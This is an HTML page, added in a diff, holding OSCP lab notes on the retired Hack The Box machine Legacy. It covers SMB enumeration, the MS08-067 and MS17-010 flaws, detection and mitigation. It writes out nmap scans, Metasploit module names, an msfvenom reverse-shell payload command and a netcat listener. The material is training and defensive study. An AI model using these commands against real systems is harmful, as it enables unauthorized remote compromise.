@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HTB — Legacy — Shruthi Poojari | OSCP Notes</title>
+  <link rel="stylesheet" href="/oscp_learning/static/style.css">
+  <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #49483e }
+.codehilite { background: #272822; color: #F8F8F2 }
+.codehilite .c { color: #959077 } /* Comment */
+.codehilite .err { color: #ED007E; background-color: #1E0010 } /* Error */
+.codehilite .esc { color: #F8F8F2 } /* Escape */
+.codehilite .g { color: #F8F8F2 } /* Generic */
+.codehilite .k { color: #66D9EF } /* Keyword */
+.codehilite .l { color: #AE81FF } /* Literal */
+.codehilite .n { color: #F8F8F2 } /* Name */
+.codehilite .o { color: #FF4689 } /* Operator */
+.codehilite .x { color: #F8F8F2 } /* Other */
+.codehilite .p { color: #F8F8F2 } /* Punctuation */
+.codehilite .ch { color: #959077 } /* Comment.Hashbang */
+.codehilite .cm { color: #959077 } /* Comment.Multiline */
+.codehilite .cp { color: #959077 } /* Comment.Preproc */
+.codehilite .cpf { color: #959077 } /* Comment.PreprocFile */
+.codehilite .c1 { color: #959077 } /* Comment.Single */
+.codehilite .cs { color: #959077 } /* Comment.Special */
+.codehilite .gd { color: #FF4689 } /* Generic.Deleted */
+.codehilite .ge { color: #F8F8F2; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #F8F8F2; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FF4689 } /* Generic.Error */
+.codehilite .gh { color: #F8F8F2 } /* Generic.Heading */
+.codehilite .gi { color: #A6E22E } /* Generic.Inserted */
+.codehilite .go { color: #66D9EF } /* Generic.Output */
+.codehilite .gp { color: #FF4689; font-weight: bold } /* Generic.Prompt */
+.codehilite .gs { color: #F8F8F2; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #959077 } /* Generic.Subheading */
+.codehilite .gt { color: #66D9EF } /* Generic.Traceback */
+.codehilite .kc { color: #66D9EF } /* Keyword.Constant */
+.codehilite .kd { color: #66D9EF } /* Keyword.Declaration */
+.codehilite .kn { color: #FF4689 } /* Keyword.Namespace */
+.codehilite .kp { color: #66D9EF } /* Keyword.Pseudo */
+.codehilite .kr { color: #66D9EF } /* Keyword.Reserved */
+.codehilite .kt { color: #66D9EF } /* Keyword.Type */
+.codehilite .ld { color: #E6DB74 } /* Literal.Date */
+.codehilite .m { color: #AE81FF } /* Literal.Number */
+.codehilite .s { color: #E6DB74 } /* Literal.String */
+.codehilite .na { color: #A6E22E } /* Name.Attribute */
+.codehilite .nb { color: #A6E22E } /* Name.Builtin */
+.codehilite .nc { color: #A6E22E } /* Name.Class */
+.codehilite .no { color: #66D9EF } /* Name.Constant */
+.codehilite .nd { color: #A6E22E } /* Name.Decorator */
+.codehilite .ni { color: #F8F8F2 } /* Name.Entity */
+.codehilite .ne { color: #A6E22E } /* Name.Exception */
+.codehilite .nf { color: #A6E22E } /* Name.Function */
+.codehilite .nl { color: #F8F8F2 } /* Name.Label */
+.codehilite .nn { color: #F8F8F2 } /* Name.Namespace */
+.codehilite .nx { color: #A6E22E } /* Name.Other */
+.codehilite .py { color: #F8F8F2 } /* Name.Property */
+.codehilite .nt { color: #FF4689 } /* Name.Tag */
+.codehilite .nv { color: #F8F8F2 } /* Name.Variable */
+.codehilite .ow { color: #FF4689 } /* Operator.Word */
+.codehilite .pm { color: #F8F8F2 } /* Punctuation.Marker */
+.codehilite .w { color: #F8F8F2 } /* Text.Whitespace */
+.codehilite .mb { color: #AE81FF } /* Literal.Number.Bin */
+.codehilite .mf { color: #AE81FF } /* Literal.Number.Float */
+.codehilite .mh { color: #AE81FF } /* Literal.Number.Hex */
+.codehilite .mi { color: #AE81FF } /* Literal.Number.Integer */
+.codehilite .mo { color: #AE81FF } /* Literal.Number.Oct */
+.codehilite .sa { color: #E6DB74 } /* Literal.String.Affix */
+.codehilite .sb { color: #E6DB74 } /* Literal.String.Backtick */
+.codehilite .sc { color: #E6DB74 } /* Literal.String.Char */
+.codehilite .dl { color: #E6DB74 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #E6DB74 } /* Literal.String.Doc */
+.codehilite .s2 { color: #E6DB74 } /* Literal.String.Double */
+.codehilite .se { color: #AE81FF } /* Literal.String.Escape */
+.codehilite .sh { color: #E6DB74 } /* Literal.String.Heredoc */
+.codehilite .si { color: #E6DB74 } /* Literal.String.Interpol */
+.codehilite .sx { color: #E6DB74 } /* Literal.String.Other */
+.codehilite .sr { color: #E6DB74 } /* Literal.String.Regex */
+.codehilite .s1 { color: #E6DB74 } /* Literal.String.Single */
+.codehilite .ss { color: #E6DB74 } /* Literal.String.Symbol */
+.codehilite .bp { color: #A6E22E } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #A6E22E } /* Name.Function.Magic */
+.codehilite .vc { color: #F8F8F2 } /* Name.Variable.Class */
+.codehilite .vg { color: #F8F8F2 } /* Name.Variable.Global */
+.codehilite .vi { color: #F8F8F2 } /* Name.Variable.Instance */
+.codehilite .vm { color: #F8F8F2 } /* Name.Variable.Magic */
+.codehilite .il { color: #AE81FF } /* Literal.Number.Integer.Long */</style>
+  <script>
+    // Set theme before paint to avoid a flash of the wrong theme.
+    (function () {
+      var saved = localStorage.getItem('theme');
+      var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+<body>
+  <aside class="sidebar">
+    <a class="brand" href="/oscp_learning/index.html">Shruthi&nbsp;Poojari<span class="brand-sub">OSCP Notes &amp; Machines</span></a>
+    <input id="filter" type="search" placeholder="Filter notes…" autocomplete="off">
+    <nav>
+      
+      <div class="group">
+        <h3>General</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/OSCP-Methodology.md.html">OSCP Methodology — Master Guide</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/README.md.html">OSCP Prep Repository</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Notes</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/DNS.md.html">Notes — DNS (53)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/FTP.md.html">Notes — FTP (21)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/File-Transfer.md.html">Notes — File Transfer</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/HTTP.md.html">Notes — HTTP / HTTPS (80 / 443 / 8080 / 8443)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/LDAP.md.html">Notes — LDAP (389 / 636)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/MSSQL.md.html">Notes — MSSQL (1433)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Metasploit.md.html">Notes — Metasploit Framework</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Nmap.md.html">Notes — Nmap</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/PrivEsc.md.html">Notes — Privilege Escalation</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Reverse-Shells.md.html">Notes — Reverse Shells & Shell Upgrades</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/SMB.md.html">Notes — SMB (139 / 445)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/WinRM.md.html">Notes — WinRM (5985 / 5986)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/References.md.html">OSCP — References & Resources</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>HTB Machines</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Enigma.md.html">HTB — Enigma</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Lame.md.html">HTB — Lame</a>
+          </li>
+          
+          <li>
+            <a class="active"
+               href="/oscp_learning/HTB/Legacy.md.html">HTB — Legacy</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Samples</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Lame-7h3rAm-writeup.md.html">Lame-7h3rAm-writeup</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Legacy-7h3rAm-writeup.md.html">Legacy-7h3rAm-writeup</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+    </nav>
+  </aside>
+
+  <main>
+    <header class="topbar">
+      <a class="topbar-brand" href="/oscp_learning/index.html">
+        <span class="dot"></span> OSCP Notes <b>&amp; Machines</b>
+      </a>
+      <nav class="topbar-links">
+        <a href="/oscp_learning/OSCP-Methodology.md.html">Methodology</a>
+        <a href="/oscp_learning/Notes/Nmap.md.html">Notes</a>
+        <a href="/oscp_learning/HTB/Lame.md.html">Machines</a>
+        
+        <a href="https://github.com/Shruthi-Poojari/oscp_learning" target="_blank" rel="noopener" class="icon-link" title="GitHub repository">GitHub <span class="ext">↗</span></a>
+        
+        <button id="theme-toggle" type="button" title="Toggle light/dark" aria-label="Toggle theme">
+          <span class="icon-dark">🌙</span><span class="icon-light">☀️</span>
+        </button>
+      </nav>
+    </header>
+    <div class="crumbs-strip">
+      <span class="crumb-group">HTB Machines</span>
+      <span class="crumb-sep">›</span>
+      <span class="crumb-page">HTB — Legacy</span>
+    </div>
+    <article class="markdown-body">
+      <h1 id="htb-legacy">HTB — Legacy</h1>
+<blockquote>
+<p><strong>Authorized lab only.</strong> Legacy is a <em>retired</em> Hack The Box machine for OSCP-style learning. The vulnerabilities below (MS08-067, MS17-010) are 8–17 years old and fully patched. Use only on this lab box or systems you are authorized to test.</p>
+</blockquote>
+<hr />
+<h2 id="machine-overview">Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td>Legacy</td>
+</tr>
+<tr>
+<td>Operating System</td>
+<td>Windows XP (SP2/SP3-era)</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Key Learning Objectives</td>
+<td>SMB enumeration, mapping old Windows to MS-numbered CVEs, SMB vuln NSE scripts, direct-to-SYSTEM SMB exploitation, classic exam-pattern Windows box</td>
+</tr>
+<tr>
+<td>Technologies Observed</td>
+<td>Windows XP, SMB (NetBIOS 139 / Direct 445)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.10.10.4
+ping<span class="w"> </span>-c1<span class="w"> </span><span class="nv">$IP</span><span class="w">        </span><span class="c1"># TTL ~128 → Windows</span>
+</code></pre></div>
+
+<p>Use <code>-Pn</code> if ICMP is filtered.</p>
+<h3 id="nmap-results">Nmap Results</h3>
+<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>--open<span class="w"> </span>-oN<span class="w"> </span>scans/allports.txt<span class="w"> </span><span class="nv">$IP</span>
+nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p139,445<span class="w"> </span>-oN<span class="w"> </span>scans/detail.txt<span class="w"> </span><span class="nv">$IP</span>
+nmap<span class="w"> </span>--script<span class="w"> </span><span class="s2">"smb-os-discovery,smb-vuln-ms08-067,smb-vuln-ms17-010"</span><span class="w"> </span>-p139,445<span class="w"> </span><span class="nv">$IP</span>
+</code></pre></div>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocol</th>
+<th>Service</th>
+<th>Version</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>139</td>
+<td>TCP</td>
+<td>NetBIOS-SSN</td>
+<td>Microsoft Windows netbios-ssn</td>
+<td>Legacy SMB transport</td>
+</tr>
+<tr>
+<td>445</td>
+<td>TCP</td>
+<td>SMB</td>
+<td>Windows XP microsoft-ds</td>
+<td><strong>Primary vector</strong> — MS08-067 and MS17-010 both apply</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>TCP</td>
+<td>RDP</td>
+<td>(often closed/filtered)</td>
+<td>Not the path</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why each service matters:</strong>
+- <strong>139/445 SMB on Windows XP</strong> — XP is long out of support. SMB on this OS is vulnerable to <strong>MS08-067</strong> (CVE-2008-4250, NetAPI RCE) and typically <strong>MS17-010</strong> (EternalBlue, CVE-2017-0144). Either yields code execution as <strong>NT AUTHORITY\SYSTEM</strong>.
+- <code>smb-os-discovery</code> confirms the XP version and build, which drives CVE selection.</p>
+<hr />
+<h2 id="service-analysis">Service Analysis</h2>
+<h3 id="smb-139445-windows-xp">SMB (139/445) — Windows XP</h3>
+<ul>
+<li><strong>What:</strong> Windows file/printer sharing + the Server service (NetAPI).</li>
+<li><strong>Why exposed:</strong> Default Windows networking left reachable.</li>
+<li><strong>Security implications:</strong></li>
+<li><strong>MS08-067:</strong> A crafted RPC request to the Server service (<code>srvsvc</code>) triggers a stack overflow → pre-auth RCE as SYSTEM.</li>
+<li><strong>MS17-010 (EternalBlue):</strong> A flaw in SMBv1 handling allows pre-auth RCE as SYSTEM.</li>
+<li><strong>Enumeration workflow:</strong>
+  <code>bash
+  smbclient -L //$IP/ -N
+  nmap --script smb-os-discovery -p445 $IP
+  nmap --script smb-vuln-ms08-067 -p445 $IP
+  nmap --script smb-vuln-ms17-010 -p445 $IP</code></li>
+<li><strong>Interesting observations:</strong> The NSE vuln scripts return <code>VULNERABLE</code> for the applicable CVE — a clear, unambiguous signal of the path.</li>
+</ul>
+<hr />
+<h2 id="attack-surface-assessment">Attack Surface Assessment</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Finding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network services</td>
+<td>SMB over 139/445 exposed</td>
+</tr>
+<tr>
+<td>Authentication</td>
+<td>Pre-auth RCE — no credentials required</td>
+</tr>
+<tr>
+<td>Legacy software</td>
+<td>Windows XP, end-of-life, unpatched SMBv1</td>
+</tr>
+<tr>
+<td>Misconfigurations</td>
+<td>SMBv1 enabled; no network segmentation of a legacy host</td>
+</tr>
+<tr>
+<td>Security weaknesses</td>
+<td>MS08-067 and/or MS17-010 → SYSTEM</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="enumeration-timeline">Enumeration Timeline</h2>
+<ol>
+<li><strong>Initial recon</strong> — Scan shows 139/445; TTL and <code>smb-os-discovery</code> confirm Windows XP.</li>
+<li><strong>Service investigation</strong> — Old Windows + SMB immediately suggests MS-series SMB CVEs.</li>
+<li><strong>Validation</strong> — <code>smb-vuln-ms08-067</code> / <code>smb-vuln-ms17-010</code> NSE scripts report <code>VULNERABLE</code>; <code>searchsploit ms08-067</code> / <code>ms17-010</code> confirm public exploits.</li>
+<li><strong>Findings</strong> — Pre-auth RCE as SYSTEM via SMB.</li>
+<li><strong>Lessons learned</strong> — Windows version alone narrows the CVE set fast; verify with NSE before committing to an exploit; pick the more reliable of the two for the target OS.</li>
+</ol>
+<hr />
+<h2 id="user-access-learnings">User Access Learnings</h2>
+<p>Like Lame, Legacy has <strong>no separate low-priv stage</strong> — the SMB exploit returns a SYSTEM shell directly, so both <code>user.txt</code> and <code>root.txt</code> are readable immediately.</p>
+<ul>
+<li><strong>Discovery process:</strong> Map Windows XP + SMBv1 → MS08-067 / MS17-010.</li>
+<li><strong>Enumeration logic:</strong> NSE vuln scripts confirm which CVE the target is susceptible to before you choose an exploit.</li>
+<li><strong>Key indicators:</strong> <code>smb-os-discovery</code> = Windows XP; <code>smb-vuln-*</code> = <code>VULNERABLE</code>.</li>
+<li><strong>High-level exploitation:</strong> Set up a listener, then launch the matching public exploit so SMB executes shellcode that connects back:
+  <code>bash
+  nc -lvnp 4444</code></li>
+<li><strong>Metasploit path:</strong> <code>use exploit/windows/smb/ms08_067_netapi</code> (or <code>ms17_010_psexec</code>/<code>eternalblue</code>), set <code>RHOSTS</code>/<code>LHOST</code>, <code>run</code>.</li>
+<li><strong>Manual path (OSCP-preferred):</strong> Use a public standalone script (e.g. an MS17-010 or MS08-067 PoC) configured with your reverse-shell payload generated via <code>msfvenom</code> (e.g. <code>windows/shell_reverse_tcp</code>). The exploit injects into the SMB service, which runs as SYSTEM, so the returned shell is SYSTEM.</li>
+</ul>
+<blockquote>
+<p><strong>OSCP note:</strong> MS08-067 target selection (the correct OS/SP/language offset) is a classic "manual exploit" lesson — pick the right target index or the box crashes. Practice the non-MSF route.</p>
+</blockquote>
+<hr />
+<h2 id="privilege-escalation-learnings">Privilege Escalation Learnings</h2>
+<ul>
+<li>No escalation required: the SMB service runs as <strong>NT AUTHORITY\SYSTEM</strong>, so the foothold already is the highest privilege.</li>
+<li><strong>Verify:</strong> <code>whoami</code> → <code>nt authority\system</code>.</li>
+<li><strong>Enumeration (good habit even here):</strong> <code>systeminfo</code>, <code>whoami /priv</code>, <code>net users</code>.</li>
+<li><strong>Security lessons:</strong> A single unpatched network service on a legacy OS = total compromise; patching discipline and decommissioning EOL systems are the real fixes.</li>
+<li><strong>Hardening opportunities:</strong> disable SMBv1, patch, isolate/retire legacy hosts.</li>
+</ul>
+<hr />
+<h2 id="detection-opportunities-blue-team">Detection Opportunities (Blue Team)</h2>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Where to look</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Log sources</td>
+<td>Windows Security/System event logs, SMB audit logs</td>
+</tr>
+<tr>
+<td>Network indicators</td>
+<td>Anomalous SMB traffic to 445; crafted <code>srvsvc</code> RPC (MS08-067) or SMBv1 trans2 patterns (MS17-010); outbound connect-back to attacker:4444</td>
+</tr>
+<tr>
+<td>Security events</td>
+<td><code>services.exe</code>/SMB service spawning <code>cmd.exe</code>; unexpected SYSTEM process creation</td>
+</tr>
+<tr>
+<td>Monitoring recs</td>
+<td>IDS/IPS signatures for MS08-067 and EternalBlue; alert on SMBv1 use; egress filtering to block reverse shells; flag EOL OS on the network</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="mitigations">Mitigations</h2>
+<table>
+<thead>
+<tr>
+<th>Area</th>
+<th>Recommendation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Configuration</td>
+<td>Disable SMBv1; restrict SMB to required hosts via firewall</td>
+</tr>
+<tr>
+<td>Hardening</td>
+<td>Remove/retire Windows XP; network-segment any unavoidable legacy host</td>
+</tr>
+<tr>
+<td>Patching</td>
+<td>Apply MS08-067 and MS17-010 patches (and migrate off EOL OS entirely)</td>
+</tr>
+<tr>
+<td>Monitoring</td>
+<td>SMB-focused IDS, EOL-asset inventory, process-ancestry alerting</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="oscp-exam-takeaways">OSCP Exam Takeaways</h2>
+<ul>
+<li><strong>Enumeration lessons:</strong> OS fingerprint drives CVE selection; confirm with NSE vuln scripts before exploiting.</li>
+<li><strong>Common exam patterns:</strong> Legacy Windows + SMB = MS-series RCE to SYSTEM; the "pick the right exploit target/offset" skill.</li>
+<li><strong>Similar machine types:</strong> Any unpatched Windows SMB host (e.g. Blue for MS17-010).</li>
+<li><strong>Key commands worth remembering:</strong>
+  <code>bash
+  nmap --script smb-os-discovery,smb-vuln-ms08-067,smb-vuln-ms17-010 -p445 $IP
+  searchsploit ms08-067
+  searchsploit ms17-010
+  msfvenom -p windows/shell_reverse_tcp LHOST=&lt;you&gt; LPORT=4444 -f &lt;fmt&gt;
+  nc -lvnp 4444</code></li>
+</ul>
+<hr />
+<h2 id="personal-notes-section">Personal Notes Section</h2>
+<blockquote>
+<p>Append your own screenshots, alternative techniques, and research below.</p>
+</blockquote>
+<h3 id="screenshots">Screenshots</h3>
+<ul>
+<li>[ ]</li>
+</ul>
+<h3 id="custom-notes">Custom Notes</h3>
+<p>-</p>
+<h3 id="alternative-techniques">Alternative Techniques</h3>
+<ul>
+<li>MS17-010 manual (no-MSF) exploitation:</li>
+<li>MS08-067 target-offset selection notes:</li>
+</ul>
+<h3 id="additional-research">Additional Research</h3>
+<ul>
+<li>CVE-2008-4250 (MS08-067):</li>
+<li>CVE-2017-0144 (MS17-010 / EternalBlue):</li>
+</ul>
+<h3 id="sample-writeups-reference">Sample Writeups (reference)</h3>
+<ul>
+<li><a href="samples/Legacy-7h3rAm-writeup.md">7h3rAm / svachal writeup</a> — phased enumeration→exploitation→SYSTEM flow; MS08-067 (NetAPI) via Metasploit.</li>
+<li>teckk2: <a href="https://teckk2.github.io/writeup/2017/12/18/Legacy.html">https://teckk2.github.io/writeup/2017/12/18/Legacy.html</a></li>
+<li>hackersnotes: <a href="https://hackersnotes.com/walkthrough-legacy-htb-retired-box/">https://hackersnotes.com/walkthrough-legacy-htb-retired-box/</a></li>
+</ul>
+    </article>
+  </main>
+
+  <script>
+    const toggle = document.getElementById('theme-toggle');
+    toggle.addEventListener('click', () => {
+      const next = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    });
+
+    const filter = document.getElementById('filter');
+    filter.addEventListener('input', () => {
+      const q = filter.value.toLowerCase();
+      document.querySelectorAll('.sidebar li').forEach(li => {
+        li.style.display = li.textContent.toLowerCase().includes(q) ? '' : 'none';
+      });
+      document.querySelectorAll('.group').forEach(g => {
+        const any = [...g.querySelectorAll('li')].some(li => li.style.display !== 'none');
+        g.style.display = any ? '' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
